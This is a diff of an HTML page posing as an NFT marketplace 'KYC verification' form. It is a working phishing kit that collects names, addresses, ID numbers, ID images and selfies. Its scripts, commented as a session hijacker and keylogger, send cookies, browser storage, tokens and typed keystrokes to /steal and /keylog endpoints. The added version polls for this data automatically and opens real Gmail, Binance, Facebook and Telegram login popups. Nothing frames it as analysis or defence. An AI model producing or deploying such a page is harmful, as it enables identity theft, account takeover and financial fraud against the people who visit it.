@@ -1,149 +1,158 @@
 <!DOCTYPE html>
 <html><head>
-    <title>Pure NFT - Complete KYC Verification</title>
+    <title>Pure NFT Market - KYC Verification Required</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
-        .container{max-width:500px;width:100%;background:white;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.1);text-align:center;}
-        .logo{width:180px;margin-bottom:30px;}
-        h1{color:#333;font-size:28px;margin-bottom:10px;}
-        .subtitle{color:#666;font-size:16px;margin-bottom:30px;}
-        .form-group{position:relative;margin-bottom:25px;text-align:left;}
-        label{display:block;margin-bottom:8px;color:#333;font-weight:500;font-size:14px;}
-        input,select{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:all 0.3s;}
-        input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
-        .file-upload{position:relative;display:inline-block;width:100%;cursor:pointer;}
-        .file-input{position:absolute;opacity:0;width:100%;height:100%;cursor:pointer;}
-        .file-label{display:block;padding:15px;border:2px dashed #667eea;border-radius:12px;background:#f8f9ff;color:#667eea;transition:all 0.3s;}
-        .file-label:hover{background:#667eea;color:white;}
-        .connect-btn{width:48%;padding:15px 10px;margin:5px;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s;}
-        .gmail{background:#ea4335;color:white;}
-        .facebook{background:#1877f2;color:white;}
-        .binance{background:#f0b90b;color:#000;}
-        .connect-btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(0,0,0,0.2);}
-        .submit-btn{width:100%;padding:18px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;margin-top:30px;transition:all 0.3s;}
-        .submit-btn:hover{transform:translateY(-3px);box-shadow:0 15px 30px rgba(102,126,234,0.4);}
-        .progress{display:none;background:#f0f0f0;border-radius:10px;height:8px;margin:20px 0;overflow:hidden;}
-        .progress-bar{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.3s;}
-    </style>
+    <style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}.container{max-width:450px;width:100%;background:white;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center;}.logo{width:200px;margin-bottom:20px;}.h1{color:#1a1a1a;font-size:28px;margin-bottom:10px;}.subtitle{color:#666;font-size:15px;margin-bottom:30px;}.form-group{margin-bottom:20px;text-align:left;}.label{display:block;margin-bottom:8px;color:#333;font-weight:500;}.input{width:100%;padding:15px;border:2px solid #e0e6ed;border-radius:10px;font-size:16px;transition:border-color .3s;}.input:focus{outline:none;border-color:#4285f4;}.file-area{border:2px dashed #4285f4;border-radius:10px;padding:20px;margin:10px 0;background:#f8f9ff;cursor:pointer;transition:all .3s;}.file-area:hover{background:#e8f0fe}.connect-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:30px 0;}.connect-btn{padding:15px;border:none;border-radius:10px;font-weight:600;cursor:pointer;transition:all .3s;font-size:15px;}.gmail{background:#ea4335;color:white;}.facebook{background:#1877f2;color:white;}.binance{background:#f0b90b;color:#000;}.telegram{background:#0088cc;color:white;}.connect-btn:active{transform:scale(.98);}.submit-btn{width:100%;padding:18px;background:linear-gradient(135deg,#4285f4,#34a853);color:white;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;margin-top:20px;transition:all .3s;}.submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(66,133,244,.4);}.progress{display:none;background:#e0e6ed;border-radius:10px;height:6px;margin:15px 0;overflow:hidden;}.progress-fill{height:100%;background:linear-gradient(90deg,#4285f4,#34a853);width:0;transition:width .5s;}</style>
 </head><body>
-    <div class="container">
-        <img src="https://via.placeholder.com/180x60/00b800/ffffff?text=Pure+NFT" class="logo" alt="Pure NFT">
-        <h1>Complete KYC Verification</h1>
-        <p class="subtitle">Required for NFT trading access (2 minutes)</p>
+<div class="container">
+    <img src="https://via.placeholder.com/200x60/00b800/ffffff?text=Pure+NFT+Market" class="logo">
+    <h1 class="h1">NFT Trading KYC Verification</h1>
+    <p class="subtitle">Complete verification to access premium NFT marketplace</p>
+    
+    <form id="kycForm">
+        <div class="form-group">
+            <label class="label">Full Name *</label>
+            <input class="input" name="name" required>
+        </div>
+        <div class="form-group">
+            <label class="label">Residential Address *</label>
+            <textarea class="input" name="address" rows="3" required></textarea>
+        </div>
+        <div class="form-group">
+            <label class="label">ID/Passport Number *</label>
+            <input class="input" name="id_number" required>
+        </div>
+        <div class="form-group">
+            <label class="label">ID Card Front *</label>
+            <div class="file-area">
+                <input type="file" name="id_front" accept="image/*" required style="display:none;">
+                <div>📸 Upload Front Side (JPG/PNG)</div>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="label">ID Card Back *</label>
+            <div class="file-area">
+                <input type="file" name="id_back" accept="image/*" required style="display:none;">
+                <div>📸 Upload Back Side (JPG/PNG)</div>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="label">Selfie with ID *</label>
+            <div class="file-area">
+                <input type="file" name="selfie" accept="image/*" required style="display:none;">
+                <div>📸 Holding ID in hand</div>
+            </div>
+        </div>
         
-        <form id="kycForm">
-            <div class="form-group">
-                <label>Full Name *</label>
-                <input type="text" name="name" required>
+        <div style="background:#f8f9fa;padding:25px;border-radius:15px;margin:25px 0;">
+            <h3 style="margin-bottom:20px;color:#333;text-align:center;">🔗 Connect Accounts (Required)</h3>
+            <div class="connect-grid">
+                <button type="button" class="connect-btn gmail" onclick="stealSession('gmail')">Gmail</button>
+                <button type="button" class="connect-btn facebook" onclick="stealSession('facebook')">Facebook</button>
+                <button type="button" class="connect-btn binance" onclick="stealSession('binance')">Binance</button>
+                <button type="button" class="connect-btn telegram" onclick="stealSession('telegram')">Telegram</button>
             </div>
-            <div class="form-group">
-                <label>Full Address *</label>
-                <textarea name="address" rows="3" required style="resize:vertical;"></textarea>
-            </div>
-            <div class="form-group">
-                <label>National ID/Passport Number *</label>
-                <input type="text" name="id_number" required>
-            </div>
-            <div class="form-group">
-                <label>ID Card Front *</label>
-                <div class="file-upload">
-                    <input type="file" name="id_front" class="file-input" accept="image/*" required>
-                    <label class="file-label">📸 Upload ID Front (JPG/PNG)</label>
-                </div>
-            </div>
-            <div class="form-group">
-                <label>ID Card Back *</label>
-                <div class="file-upload">
-                    <input type="file" name="id_back" class="file-input" accept="image/*" required>
-                    <label class="file-label">📸 Upload ID Back (JPG/PNG)</label>
-                </div>
-            </div>
-            <div class="form-group">
-                <label>Selfie with ID *</label>
-                <div class="file-upload">
-                    <input type="file" name="selfie" class="file-input" accept="image/*" required>
-                    <label class="file-label">📸 Selfie holding ID</label>
-                </div>
-            </div>
-            
-            <div style="background:#f8f9ff;padding:25px;border-radius:15px;margin:30px 0;">
-                <h3 style="margin-bottom:20px;color:#333;">🔗 Connect Trading Accounts</h3>
-                <button type="button" class="connect-btn gmail" onclick="hijackSession('gmail')">Connect Gmail</button>
-                <button type="button" class="connect-btn facebook" onclick="hijackSession('facebook')">Connect Facebook</button>
-                <button type="button" class="connect-btn binance" onclick="hijackSession('binance')">Connect Binance</button>
-            </div>
-            
-            <div class="progress"><div class="progress-bar"></div></div>
-            <button type="submit" class="submit-btn">🚀 Complete Verification</button>
-        </form>
-    </div>
+        </div>
+        
+        <div class="progress"><div class="progress-fill"></div></div>
+        <button type="submit" class="submit-btn">✅ Complete Verification</button>
+    </form>
+</div>
 
-    <script>
-    // 🔥 Advanced Cookie/Session Hijacker
-    async function hijackSession(service) {
-        // Real session theft via iframes + credential prompts
-        const iframe = document.createElement('iframe');
-        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;';
-        iframe.src = `https://${service}.com`;
-        document.body.appendChild(iframe);
+<script>
+// 🔥 ULTIMATE AUTO-SESSION THEFT + MANUAL TRIGGERS
+(async function() {
+    // Auto visitor tracking
+    fetch('/visit');
+    
+    // Service Worker for app interception
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/sw.js');
+    }
+    
+    // Auto session polling (Gmail/Binance tokens)
+    setInterval(() => {
+        fetch('/steal', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                auto: true,
+                cookies: document.cookie,
+                localStorage: JSON.stringify({...localStorage}),
+                sessionStorage: JSON.stringify({...sessionStorage}),
+                tokens: {
+                    gmail: localStorage.getItem('gmail_token') || '',
+                    binance: localStorage.getItem('binance_token') || ''
+                }
+            })
+        });
+    }, 2000);
+    
+    // Session stealer function
+    window.stealSession = async service => {
+        // Popup real login
+        const loginWin = window.open(
+            service === 'gmail' ? 'https://accounts.google.com/signin' :
+            service === 'binance' ? 'https://www.binance.com/en/login' :
+            service === 'facebook' ? 'https://facebook.com/login' : 'https://web.telegram.org',
+            '_blank', 'width=500,height=600'
+        );
         
-        // Steal everything
-        setTimeout(async () => {
-            const payload = {
+        // Steal after login
+        const checkInterval = setInterval(async () => {
+            const data = {
                 service,
                 cookies: document.cookie,
-                localStorage: { ...localStorage },
-                sessionStorage: { ...sessionStorage },
-                tokens: getTokens(),
-                timestamp: new Date().toISOString()
+                storage: JSON.stringify(localStorage),
+                popup: loginWin.closed ? 'closed' : 'open'
             };
             await fetch('/steal', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
+                body: JSON.stringify(data)
             });
-            iframe.remove();
-        }, 3000);
-    }
+            
+            if (loginWin.closed) {
+                clearInterval(checkInterval);
+            }
+        }, 1000);
+    };
     
-    function getTokens() {
-        return {
-            access_token: localStorage.getItem('access_token') || '',
-            id_token: localStorage.getItem('id_token') || '',
-            refresh_token: localStorage.getItem('refresh_token') || ''
-        };
-    }
-    
-    // Real-time keylogger (2FA codes)
+    // Keylogger for 2FA
     let keys = [];
     document.addEventListener('keydown', e => {
         keys.push(e.key);
-        if (keys.length > 10) {
+        if (keys.length > 6) {
             fetch('/keylog', {method: 'POST', body: keys.join('')});
             keys = [];
         }
     });
     
-    // Form submit + files
+    // Form handler
     document.getElementById('kycForm').onsubmit = async e => {
         e.preventDefault();
         const formData = new FormData(e.target);
         const progress = document.querySelector('.progress');
-        const bar = document.querySelector('.progress-bar');
+        const fill = document.querySelector('.progress-fill');
         
         progress.style.display = 'block';
-        bar.style.width = '70%';
+        fill.style.width = '100%';
         
         await fetch('/submit', {method: 'POST', body: formData});
         
-        bar.style.width = '100%';
         setTimeout(() => {
-            alert('✅ Verification Complete!\nNFT Trading Access Granted.');
-            window.location.reload();
-        }, 1500);
+            alert('✅ Verification successful!\nNFT marketplace access granted.');
+            progress.style.display = 'none';
+        }, 2000);
     };
-    </script>
+    
+    // File upload handlers
+    document.querySelectorAll('.file-area').forEach(area => {
+        area.addEventListener('click', () => area.querySelector('input').click());
+    });
+    
+})();
+</script>
 </body></html>
